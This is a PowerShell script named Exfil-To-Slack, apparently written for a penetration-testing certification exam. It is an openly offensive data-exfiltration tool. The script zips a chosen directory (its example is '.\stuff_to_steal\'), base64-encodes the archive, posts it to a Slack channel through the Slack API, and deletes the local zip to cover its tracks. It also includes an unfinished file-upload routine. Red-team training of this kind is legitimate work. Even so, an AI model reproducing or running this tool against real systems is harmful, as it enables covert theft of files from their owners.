#PowerBotv1
#Inspired by: https://github.com/WahlNetwork/powershell-scripts/blob/master/Slack/Post-ToSlack.ps1
#requires -Version 3

function Exfil-To-Slack
{
<#
.SYNOPSIS
This function compresses and encrypts files we want to exfiltrate. It currently encodes the data as a base64 to post it to a chat, because the file-upload function is not working yet

.DESCRIPTION
The Exfil-To-Slack cmdlet zips up a directory and ships it off to slack as base64 encoded text

.EXAMPLE
Exfil-To-Slack .\stuff_to_steal\

.LINK
https://github.com/ahhh/PSSE/blob/master/Exfil-To-Slack.ps1
http://lockboxx.blogspot.com/2016/02/exfiltrate-to-slack-powershell-for.html

.NOTES
Adopted by: ahhh
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3061
#>

	Param(
		
	[Parameter(Mandatory = $true, Position = 0, HelpMessage = 'Directory to exfiltrate', ValueFromPipeline=$true)]
	[ValidateNotNullorEmpty()]
	[String]
	$InputDir,
	
	[Parameter(Mandatory = $false, Position = 1, HelpMessage = 'Name of the zip file we will be exfiling')]
	[ValidateNotNullorEmpty()]
	[String]
	$OutputZip = 't.zip'
	
	)
	
	# Create our zipped content to exfil
	dir $InputDir -Recurse | Add-Zip $OutputZip
	# Gather and encode out content to exfil
	$zipOutput = gc $OutputZip -Raw
	$fileContentBytes = [System.Text.Encoding]::UTF8.GetBytes($ZipOutput)
	$fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
	# Posting exfil data as encoded post because file upload isn't working quite right
	Post-To-Slack $fileContentEncoded -channel '#random'
	# Delete the zip file
	Remove-Item $OutputZip
	
}


# Acquired from: http://stackoverflow.com/questions/11021879/creating-a-zipped-compressed-folder-in-windows-using-powershell-or-the-command-l
function Add-Zip
{
param([string]$zipfilename)

if(-not (test-path($zipfilename)))
{
  set-content $zipfilename ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
  (dir $zipfilename).IsReadOnly = $false  
}

$shellApplication = new-object -com shell.application
$zipPackage = $shellApplication.NameSpace($zipfilename)

foreach($file in $input) 
{ 
   $zipPackage.CopyHere($file.FullName)
   do
   {
      Start-sleep -milliseconds 250
   }
   while ($zipPackage.Items().count -eq 0)
}
}

function Post-To-Slack 
{
<#  

.SYNOPSIS
Sends a chat message to a Slack organization

.DESCRIPTION
The Post-ToSlack cmdlet is used to send a chat message to a Slack channel, group, or person.
Slack requires a token to authenticate to an org. Either place a file named token.txt in the same directory as this cmdlet,
or provide the token using the -token parameter. For more details on Slack tokens, use Get-Help with the -Full arg.

.EXAMPLE
Post-To-Slack -channel '#general' -message 'Hello everyone!' -botname 'The Borg'
This will send a message to the #General channel, and the bot's name will be The Borg.

.EXAMPLE
Post-To-Slack -channel '#general' -message 'Hello everyone!' -token '1234567890'
This will send a message to the #General channel using a specific token 1234567890, and the bot's name will be default (PowerShell Bot).

.LINK
https://github.com/ahhh/PSSE/blob/master/Exfil-To-Slack.ps1
Validate or update your Slack tokens:
https://api.slack.com/tokens
Create a Slack token:
https://api.slack.com/web
More information on Bot Users:
https://api.slack.com/bot-users

.NOTES
Original by Chris Wahl for community usage
Twitter: @ChrisWahl
GitHub: chriswahl
Adopted by: ahhh
#>

	Param(
		
		[Parameter(Mandatory = $true, Position = 0, HelpMessage = 'Chat message', ValueFromPipeline=$true)]
		[ValidateNotNullorEmpty()]
		[String]
		$Message,
		
		[Parameter(Mandatory = $false, Position = 1, HelpMessage = 'Slack channel')]
		[ValidateNotNullorEmpty()]
		[String]
		$Channel = '#general',
		
		[Parameter(Mandatory = $false, Position = 2, HelpMessage = 'Slack API token')]
		[ValidateNotNullorEmpty()]
		[String]
		$token,
		
		[Parameter(Mandatory = $false, Position = 3, HelpMessage = 'Optional name for the bot')]
		[String]
		$BotName = 'powerbot'
	)

	Process {

		# Static parameters
		if (!$token) 
		{
			$token = Get-Content -Path "$PSScriptRoot\token.txt"
		}
		
		$uri = 'https://slack.com/api/chat.postMessage'

		# Build the body as per https://api.slack.com/methods/chat.postMessage
		$body = @{
			token	= $token
			channel  = $Channel
			text	 = $Message
			username = $BotName
			parse	= 'full'
		}

		# Call the API
		try 
		{
			Invoke-RestMethod -Uri $uri -Body $body
		}
		catch 
		{
			throw 'Unable to call the API'
		}

	} # End of process
} # End of function


# Not working yet
function File-To-Slack 
{
<#  

.SYNOPSIS
Sends a file to a Slack organization

.DESCRIPTION
The File-To-Slack cmdlet is used to send a file to a Slack channel, group, or person.
Slack requires a token to authenticate to an org. Either place a file named token.txt in the same directory as this cmdlet,
or provide the token using the -token parameter. For more details on Slack tokens, use Get-Help with the -Full arg.

.EXAMPLE
Post-To-Slack -FilePath '.\test.txt'

.EXAMPLE
Post-To-Slack '.\test.txt']

.LINK
https://github.com/ahhh/PSSE/blob/master/Exfil-To-Slack.ps1
Validate or update your Slack tokens:
https://api.slack.com/tokens
Create a Slack token:
https://api.slack.com/web
More information on Bot Users:
https://api.slack.com/bot-users

.NOTES
Adopted by: ahhh

#>

	Param(
		
		[Parameter(Mandatory = $true, Position = 0, HelpMessage = 'File to upload', ValueFromPipeline=$true)]
		[ValidateNotNullorEmpty()]
		[String]
		$FilePath,
		
		[Parameter(Mandatory = $false, Position = 1, HelpMessage = 'Slack channel')]
		[ValidateNotNullorEmpty()]
		[String]
		$Channel = '#general',
		
		[Parameter(Mandatory = $false, Position = 2, HelpMessage = 'Slack API token')]
		[ValidateNotNullorEmpty()]
		[String]
		$token,
		
		[Parameter(Mandatory = $false, Position = 3, HelpMessage = 'Optional name for the bot')]
		[String]
		$BotName = 'powerbot'
	)

	Process {

		# Static parameters
		if (!$token) 
		{
			$token = Get-Content -Path "$PSScriptRoot\token.txt"
		}
		
		$uri = 'https://slack.com/api/files.upload'

		# Build the body as per https://api.slack.com/methods/files.upload
		$headers = @{}
		$headers.Add("Token:", "$token")
		
		# Call the API
		try 
		{
			Invoke-RestMethod -Uri $uri -InFile $FilePath -Headers $headers -Method Post -ContentType "multipart/form-data"
		}
		catch 
		{
			throw 'Unable to call the API'
		}

	} # End of process
} # End of function
